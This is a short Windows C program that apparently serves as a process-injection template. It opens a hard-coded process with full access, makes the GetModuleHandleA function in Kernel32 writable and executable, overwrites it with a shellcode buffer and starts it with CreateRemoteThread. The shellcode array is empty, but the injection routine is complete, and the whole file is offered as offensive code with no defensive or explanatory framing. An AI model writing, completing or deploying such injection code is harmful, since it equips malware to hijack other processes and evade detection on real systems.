#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define abcd "Kernel32.dll"
#define efgh "GetModuleHandleA"

int main() {
    // Retrieve the address of the GetModuleHandleA function
    LPVOID funcAddress = GetProcAddress(GetModuleHandleA(abcd), efgh);

    // Check if the function address was retrieved successfully
    if (funcAddress == NULL) {
        printf("GetProcAddress failed with error no %d\n", GetLastError());
    }
    else {
        printf("Address of %s in %s: 0x%p\n", abcd, efgh, funcAddress);
    }


    unsigned char shellcode[] = {  };
    unsigned char* pshellcode = shellcode;

    SIZE_T szshellcode = sizeof(shellcode);


    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 29480);

    if (hprocess == NULL) {
        printf("The openprocess failed with error no %d\n", GetLastError());
    }
    DWORD oldprotection;
    if (!VirtualProtectEx(hprocess, funcAddress, szshellcode, PAGE_EXECUTE_READWRITE, &oldprotection)) {
        printf("virtualprotectexfailed with error no %d\n", GetLastError());
    }
    SIZE_T noofbtwr;

    WriteProcessMemory(hprocess, funcAddress, pshellcode, szshellcode, &noofbtwr);

    CreateRemoteThread(hprocess, NULL, NULL, funcAddress, NULL, NULL, NULL);

    printf("press enter to exit");
    getchar();

    return 0;
}
